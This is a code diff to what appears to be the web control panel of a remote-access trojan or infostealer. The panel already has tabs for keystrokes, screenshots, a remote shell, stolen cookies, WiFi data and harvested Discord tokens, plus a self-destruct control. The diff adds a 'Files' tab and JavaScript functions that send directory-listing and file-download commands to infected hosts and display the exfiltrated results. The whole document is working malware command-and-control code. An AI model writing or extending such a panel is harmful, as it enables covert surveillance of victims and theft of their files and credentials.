@@ -98,6 +98,7 @@
       <button class="tab-btn" onclick="switchTab('cookies', this)">Cookies</button>
       <button class="tab-btn" onclick="switchTab('wifi', this)">WiFi</button>
       <button class="tab-btn" onclick="switchTab('discord', this)">Discord</button>
+      <button class="tab-btn" onclick="switchTab('files', this)">Files</button>
     </div>
 
     <main id="tabActivity" class="tab-content active border border-slate-800 bg-slate-900/20 rounded-xl overflow-hidden shadow-2xl">
@@ -298,6 +299,21 @@
           </div>
         </div>
       </div>
+    </main>
+
+    <main id="tabFiles" class="tab-content border border-slate-800 bg-slate-900/20 rounded-xl overflow-hidden shadow-2xl p-5">
+      <div class="flex items-center gap-3 mb-3">
+        <input type="text" id="filePath" placeholder="C:\Users\..." value="C:\Users\" class="flex-1 bg-slate-950 border border-slate-800 text-sm rounded-lg px-3 py-2 text-slate-300 placeholder-slate-500 focus:outline-none focus:border-emerald-500 transition">
+        <button class="px-4 py-2 text-sm font-medium text-white bg-emerald-600 hover:bg-emerald-700 rounded-lg border border-emerald-500 transition" onclick="sendDirlist()">Browse</button>
+        <select id="fileHostSelect" class="bg-slate-950 border border-slate-800 text-sm rounded-lg px-3 py-2 text-slate-300 focus:outline-none focus:border-emerald-500 transition">
+          <option value="" disabled selected>Host...</option>
+        </select>
+      </div>
+      <div class="flex items-center gap-3 mb-4">
+        <input type="text" id="downloadPath" placeholder="Full path to file..." class="flex-1 bg-slate-950 border border-slate-800 text-sm rounded-lg px-3 py-2 text-slate-300 placeholder-slate-500 focus:outline-none focus:border-violet-500 transition">
+        <button class="px-4 py-2 text-sm font-medium text-white bg-violet-600 hover:bg-violet-700 rounded-lg border border-violet-500 transition" onclick="sendDownload()">Download</button>
+      </div>
+      <div id="fileResults" class="text-sm mono-log text-slate-400 bg-slate-950/50 rounded-lg p-4 border border-slate-800 max-h-96 overflow-y-auto" style="min-height:120px; white-space:pre-wrap">Enter a path and click Browse</div>
     </main>
   </div>
 
@@ -1097,6 +1113,78 @@ async function forceDiscordHarvest() {
   btn.disabled = false; btn.textContent = 'Force Harvest';
 }
 
+async function sendDirlist() {
+  const path = document.getElementById('filePath').value.trim();
+  const hostname = document.getElementById('fileHostSelect').value;
+  if (!path) { showToast('Enter a path', 'error'); return; }
+  if (!hostname) { showToast('Select a host', 'error'); return; }
+  try {
+    await fetch(PROXY_URL + '?path=/rest/v1/control', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ command: 'dirlist', hostname: hostname, payload: path, executed: false })
+    });
+    document.getElementById('fileResults').textContent = 'Requested dirlist for ' + path + ' on ' + hostname + ' (check back in ~60s)';
+    showToast('Dirlist requested', 'success');
+  } catch (err) { showToast('Failed: ' + err.message, 'error'); }
+}
+
+async function sendDownload() {
+  const path = document.getElementById('downloadPath').value.trim();
+  const hostname = document.getElementById('fileHostSelect').value;
+  if (!path) { showToast('Enter a file path', 'error'); return; }
+  if (!hostname) { showToast('Select a host', 'error'); return; }
+  try {
+    await fetch(PROXY_URL + '?path=/rest/v1/control', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ command: 'download', hostname: hostname, payload: path, executed: false })
+    });
+    const fname = path.split('\\').pop().split('/').pop();
+    showToast('Download requested for ' + fname + ' from ' + hostname + ' (check in ~60s)', 'success');
+  } catch (err) { showToast('Failed: ' + err.message, 'error'); }
+}
+
+async function fetchFileResults() {
+  const container = document.getElementById('fileResults');
+  try {
+    const res = await fetch(PROXY_URL + '?path=' + encodeURIComponent('/rest/v1/exec_results?order=created_at.desc&limit=20'));
+    if (!res.ok) return;
+    const data = await res.json();
+    const rows = data.filter(r => r.command && (r.command.startsWith('dirlist') || r.command.startsWith('download')));
+    if (rows.length === 0) { container.textContent = 'No file operations yet. Enter a path and click Browse.'; return; }
+    container.innerHTML = rows.slice(0, 10).map(r => {
+      const ts = r.created_at ? new Date(r.created_at).toLocaleString() : '-';
+      const out = (r.output || '').trim();
+      let dlLinks = '';
+      if (r.command && r.command.startsWith('download') && r.result_url) {
+        dlLinks = '<br><a href="' + escapeHtml(r.result_url) + '" target="_blank" class="text-emerald-400 hover:text-emerald-300 underline">Download</a>';
+      }
+      return '<div class="mb-3 pb-3 border-b border-slate-800 last:border-0">'
+        + '<span class="text-slate-500 text-xs">' + ts + '</span> '
+        + '<span class="text-emerald-400 text-xs">' + escapeHtml(r.hostname || '') + '</span>'
+        + '<span class="text-slate-400 text-xs ml-2">' + escapeHtml(r.command || '') + '</span>'
+        + '<div class="mt-1 text-slate-300 text-xs">' + escapeHtml(out.substring(0, 2000)) + '</div>'
+        + dlLinks
+        + '</div>';
+    }).join('');
+  } catch (_) {}
+}
+
+function populateFileHostnames() {
+  const sel = document.getElementById('fileHostSelect');
+  const mainSel = document.getElementById('hostnameInput');
+  sel.innerHTML = '';
+  for (const opt of mainSel.options) {
+    if (opt.value) {
+      const n = document.createElement('option');
+      n.value = opt.value;
+      n.textContent = opt.textContent;
+      sel.appendChild(n);
+    }
+  }
+}
+
 document.getElementById('stopBtn').addEventListener('click', sendStop);
 document.getElementById('destructBtn').addEventListener('click', sendDestruct);
 
@@ -1109,16 +1197,23 @@ document.getElementById('triggerInput').addEventListener('keydown', (e) => {
 document.getElementById('shellInput').addEventListener('keydown', (e) => {
   if (e.key === 'Enter') runCommand();
 });
+document.getElementById('filePath').addEventListener('keydown', (e) => {
+  if (e.key === 'Enter') sendDirlist();
+});
+document.getElementById('downloadPath').addEventListener('keydown', (e) => {
+  if (e.key === 'Enter') sendDownload();
+});
 
 window.addEventListener('DOMContentLoaded', () => {
   populateHostnames();
+  populateFileHostnames();
   fetchKeys(true);
   fetchHeartbeat();
   fetchLatestVersion();
   fetchHarvestState();
   setInterval(fetchHeartbeat, 10000);
   refreshInterval = setInterval(() => {
-    if (currentTab === 'activity') { fetchKeys(); populateHostnames(); }
+    if (currentTab === 'activity') { fetchKeys(); populateHostnames(); populateFileHostnames(); }
     else if (currentTab === 'screenshots') fetchScreenshots();
     else if (currentTab === 'triggers') fetchTriggers();
     else if (currentTab === 'shell') fetchExecResults();
@@ -1126,6 +1221,7 @@ window.addEventListener('DOMContentLoaded', () => {
     else if (currentTab === 'cookies') fetchCookies();
     else if (currentTab === 'wifi') fetchWiFi();
     else if (currentTab === 'discord') { fetchDiscordTokens(); document.getElementById('discordStatus').textContent = g_discordToken ? 'Token loaded' : 'No token'; }
+    else if (currentTab === 'files') fetchFileResults();
   }, 20000);
   setInterval(tick, 1000);
 });
